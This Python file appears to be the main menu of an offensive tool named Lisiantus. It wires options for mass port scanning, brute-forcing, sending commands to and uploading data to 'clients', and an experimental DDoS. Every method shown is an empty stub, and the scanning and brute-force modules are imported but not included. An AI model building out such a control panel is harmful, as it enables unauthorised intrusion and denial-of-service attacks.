#!/usr/bin/env python3.7
# -*- coding: utf-8 -*-
import subprocess

from libs import uix

from libs.modules.masscan import Masscan
from libs.modules.bruteforce import Bruteforce


class Lisiantus(object):
    def __init__(self):
        self.menu_dict = {
            '1': Masscan,               # Masscan
            '2': Bruteforce,            # Bruteforce
            '3': self.check_alive,      # Check alive servers
            '4': self.upload_data,      # Upload data to client
            '5': self.send_command,     # Send command
            '6': self.ddos              # DDos target (Experimental)
        }

    def check_alive(self):
        pass

    def upload_data(self):
        pass

    def send_command(self):
        pass

    def ddos(self):
        pass

    def run(self):
        subprocess.run(['clear'])
        uix.show_menu()

        while True:
            choice = input('> ')
            subprocess.run(['clear'])
            self.menu_dict[choice]().run()


if __name__ == '__main__':
    Lisiantus().run()
